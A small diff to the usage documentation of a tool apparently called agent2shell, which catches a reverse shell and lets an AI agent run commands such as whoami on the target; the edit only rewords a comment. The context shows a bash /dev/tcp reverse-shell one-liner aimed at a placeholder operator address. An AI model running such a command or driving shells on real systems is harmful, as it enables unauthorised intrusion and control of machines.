@@ -29,7 +29,7 @@ agent2shell catch -p 4444
 # Target sends reverse shell
 bash -c 'bash >& /dev/tcp/OPERATOR_IP/4444 0>&1'
 
-# Terminal 2: your AI agent interacts with the shell via the CLI
+# Terminal 2: your AI agent interacts with the reverse shell via the CLI
 agent2shell run whoami
 agent2shell run uname -a
 agent2shell status
